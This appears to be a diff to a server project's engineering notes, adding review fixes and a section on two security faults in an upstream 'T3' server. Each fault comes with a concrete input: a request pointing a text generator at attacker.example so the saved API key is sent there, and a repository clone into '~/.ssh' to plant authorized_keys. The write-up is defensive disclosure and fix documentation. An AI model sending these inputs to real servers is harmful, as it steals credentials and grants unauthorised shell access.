@@ -476,6 +476,57 @@ Memory: the T3 transcript replay (18 scenarios, release) peaked at 4.11–4.16 M
 `main` and 3.94–4.28 MiB on the branch (3 runs each); the new state is bounded (64 roster
 tasks, 64 links, 8 tails per turn, 16 ledger models).
 
+## Review fixes: source control and text generation (2026-11-14)
+
+A review and a checker's verdict (`/tmp/conn-reviews/source-control-textgen-verdict.md`) gave
+these fixes, one commit each, each with a test that fails without it:
+
+- The saved text generator key fills the redaction marker only for a caller with
+  `providers:manage` (handler test, both callers).
+- `sourceControl.cloneRepository` needs `filesystem:write` as well (`STRICTER` in
+  `scopes.rs`; test, both callers).
+- `main` reads the login shell's `PATH` before it detects Codex; the server prints
+  `providers: …` at start (`tests/login_path.rs`: the binary, a stand-in login shell, a stub
+  `codex` only on that shell's `PATH`).
+- A text generator base URL that resolves to a link-local address is refused on the dialled
+  address (`LinkLocal::Refuse` in `conn_source_control::http`).
+- Concurrent login-shell refreshes coalesce (`LoginRefresh`); `claim_refresh` is gone.
+- `server.listTextGeneratorModels` is checked at decode (`LIMITED_METHODS`; 6 new limit cases).
+- `followed-files.txt` follows the text generation and login environment sources.
+- `http`: a fragment after a bare host, a query-only `Location`.
+- Stub logs quote the log path and ambiguous arguments.
+
+Left to another worker: host tokens that the T3 server moved to its secret store (finding 3).
+
+## Faults found in the T3 server
+
+Faults that the T3 server has and this server fixes on purpose. Each is to be written up for
+T3 Code.
+
+- **The redaction marker sends the saved text generator key to the caller's host.**
+  `apps/server/src/textGeneration/TextGenerators.ts:133-138`: when
+  `server.listTextGeneratorModels` gets a `config` whose `apiKey` is the marker, the saved key
+  replaces it, whatever `baseUrl` the config names. The method needs only `settings:write`
+  (`packages/contracts/src/clientRpcPermissions.ts:37`); changing text generators needs
+  `providers:manage`. Input: a client paired with `settings:write` alone sends
+  `{"id":"<saved id>","config":{"kind":"openaiCompatible","baseUrl":"https://attacker.example/v1","apiKey":"••••••"}}`.
+  Effect: the server sends `Authorization: Bearer <saved key>` (or `x-api-key` for Anthropic)
+  to that host, silently; `test: true` also sends a POST. T3's own test
+  (`TextGenerators.test.ts:165-188`) expects the key at a new host. Our fix: the handler fills
+  the saved key in only when the caller also holds `providers:manage`; otherwise it sends no
+  key (`crates/conn-server/src/methods/text_generation.rs`). The owner's edit form keeps
+  working, also after a changed host.
+- **A clone writes to any path with `source-control:write` alone.**
+  `apps/server/src/sourceControl/SourceControlRepositoryService.ts:241-286`
+  (`normalizeDestinationPath`, `prepareDestination`) accept any absolute or `~` path, create
+  the missing parents, and clone into a missing or empty folder. The method needs only
+  `source-control:write` (`clientRpcPermissions.ts:53`). Input: `sourceControl.cloneRepository`
+  with a repository the caller controls and `destinationPath: "~/.ssh"` on a host without
+  `~/.ssh`. Effect: a folder of the caller's content (such as `authorized_keys`) at that path, a
+  filesystem write outside the scope (traced in the code, not run). Our fix: the method needs
+  `source-control:write` and `filesystem:write` (`STRICTER` in
+  `crates/conn-server/src/scopes.rs`).
+
 ## What is left, in the planned order
 
 1. **Rust hygiene, step 1: done (2026-11-14).** The toolchain is pinned to 1.99.1; BeautifulRust's
